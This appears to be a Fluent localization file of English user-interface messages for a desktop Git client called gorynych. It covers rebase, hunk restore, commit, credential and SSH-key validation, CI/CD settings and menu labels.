branch-changed-after-preview = The branch changed after the preview
preview-will-refresh-check-it = The preview will refresh — check it and apply again.
nothing-changes = Nothing changes
invalid-preview-result = Invalid preview result
rebase-preview = rebase (preview): { $a0 }
uncommitted-edits-in-files-rebase = Uncommitted edits in files the rebase changes
commit-them-or-stash-then-apply = Commit them or Stash, then apply the rebase.
rebase-stopped-at-conflict = The rebase stopped at a conflict
resolve-conflicts-in-files-and = Resolve the conflicts in the files and click "Continue" in the yellow bar at the top. "Abort" restores everything.

## crates/gorynych-git/src/restore.rs

file-is-neither-in-working = The file is neither in the working folder nor in that version — nothing to change
file-already-matches-this-version = The file already matches this version
no-files-selected = No files selected
this-isnt-stash = This isn't a stash
invalid-file = Invalid file
file-isnt-in-stash = File { $a0 } isn't in the stash
these-files-in-working-folder = These files in the working folder are already the same as in the stash
unknown-mode = Unknown mode
unknown-hunk-action = Unknown hunk action
binary-file-cant-be-changed = Binary file — can't be changed by hunks
use-restore-file-to-its = Use "Restore the file to its version…" for the whole file.
file-has-no-changes = The file has no changes
hunk-not-found-diff-changed = Hunk not found — the diff changed
refresh-view-if-ignore-whitespace = Refresh the view. If "ignore whitespace" is on, turn it off: hunks are computed from the exact text.
file-isnt-in-working-folder = The file isn't in the working folder
use-restore-file-to-its-version = Use "Restore the file to its version before this commit" — it creates the file again.
restore-whole-file-from-stash = Restore the whole file from the stash.
hunk-doesnt-apply-these-lines = The hunk doesn't apply: these lines in the working folder are already different
restore-whole-file-from-stash-it = Restore the whole file from the stash (it replaces the current version; Undo brings it back).
this-hunk-is-already-changed = This hunk is already changed in the working folder — it can't be reverted automatically
lines-around-it-changed-after = The lines around it changed after the commit. You can restore the whole file to its version before this commit.
hunk-doesnt-apply-file-changed = The hunk doesn't apply — the file changed
refresh-view-and-retry = Refresh the view and retry.
cant-undo-file-changed-after = Can't undo: file { $a0 } changed after the operation
file-was-edited-after-revert = The file was edited after the revert — restore it manually or via the diff.

## crates/gorynych-git/src/run.rs

looked-for-git-exe-in =
    Looked for git.exe in:
    { $a0 }

## crates/gorynych-git/src/worktree_file.rs

file-is-not-in-working = The file is not in the working folder
symbolic-link-cant-be-edited = A symbolic link can't be edited as a file
binary-file-cant-be-edited = A binary file can't be edited as text
file-isnt-utf-8-encoded = The file isn't UTF-8 encoded — editing is unavailable

## crates/gorynych-git/src/write.rs

invalid-file-list = Invalid file list
empty-commit-message = Empty commit message
template-file-not-found = Template file not found: { $a0 }
template-file-is-too-large = The template file is too large (over 64 KB)
invalid-branch-name-2 = Invalid branch name

## crates/gorynych-storage/src/credentials/mod.rs

unknown-server-type = Unknown server type
no-credentials-are-needed-for = No credentials are needed for a local address
no-sign-in-method-selected = No sign-in method selected
username-password-and-token-work = Username/password and token work only for https:// addresses
remote-address-is-ssh-choose = The remote address is SSH. Choose the "SSH key" tab or change the remote address to https://.
over-http-password-or-token = Over http:// the password or token is sent in plain text
change-remote-address-to-https = Change the remote address to https:// or sign in with an SSH key.
ssh-key-works-only-for = An SSH key works only for SSH addresses (git@host:… or ssh://…)
remote-address-is-https-sign = The remote address is https://. Sign in with a username and password or a token, or change the remote address to SSH.
for-example-https-gitlab-com = For example: https://gitlab.com/group/project.git
enter-username = Enter a username
enter-token = Enter a token
enter-password = Enter a password
line-break-in-username-or = A line break in the username or password isn't allowed
choose-private-key-file = Choose a private key file
key-file-not-found = Key file not found
this-is-public-key-pub = This is a public key (.pub) — choose the private one, without an extension
pipeline-token-must-not-contain = The pipeline token must not contain spaces

## crates/gorynych-storage/src/credentials/target.rs

doesnt-look-like-server-address = Doesn't look like a server address
specify-server-address = Specify the server address
for-example-gitlab-company-com = For example: gitlab.company.com
for-example-gitlab-company-com-or = For example: gitlab.company.com or https://git.company.com:8443

## crates/gorynych-storage/src/db.rs

settings-storage-unavailable = Settings storage unavailable

## crates/gorynych-storage/src/repo_providers.rs

api-address-must-start-with = The API address must start with https://
invalid-api-address = Invalid API address
for-example-https-gitlab-company = For example: https://gitlab.company.com or https://github.company.com/api/v3
unknown-ci-cd-provider = Unknown CI/CD provider

## crates/gorynych-storage/src/secrets.rs

encryption-isnt-available-in-system = Encryption isn't available in the system — the credentials can't be saved securely

## crates/gorynych-storage/src/ssh_keys.rs

unknown-key-type = Unknown key type
key-file-name-no-folders = Key file name — no folders, no leading dot and no .pub at the end
couldnt-create-ssh-key = Couldn't create the SSH key
ssh-keygen-program-wasnt-found = The ssh-keygen program wasn't found. Install OpenSSH or Git for Windows.

## crates/gorynych-tauri/src/commands/creds.rs

specify-full-repository-address = Specify the full repository address
for-example-https-gitlab-company-com = For example: https://gitlab.company.com/group/project.git
remote-address-is-no-longer = The remote address is no longer https:// — nothing to change
theres-no-pub-file-next = There's no .pub file next to the key

## crates/gorynych-tauri/src/commands/desktop.rs

open-git-repository = Open a Git repository
private-ssh-key = Private SSH key
this-format-isnt-supported = This format isn't supported
image-is-too-large-mb = The image is too large ({ $a0 } MB, 25 MB max)
images = Images
background-image = Background image
save-artifact = Save artifact
archive = Archive
folder-not-found-2 = Folder not found
couldnt-open-folder = Couldn't open the folder
command-prompt = Command Prompt
couldnt-open-terminal = Couldn't open the terminal
none-of-known-terminals-was = None of the known terminals was found. Open the folder manually.

## crates/gorynych-tauri/src/commands/menu.rs

no-actions = No actions
about = About { $a0 }
settings = Settings…
hide = Hide { $a0 }
hide-others = Hide others
show-all = Show all
quit = Quit { $a0 }
cut = Cut
copy = Copy
paste = Paste
select-all = Select all
full-screen = Full screen
file-2 = File
edit = Edit
view = View
actions = Actions
window = Window
help = Help
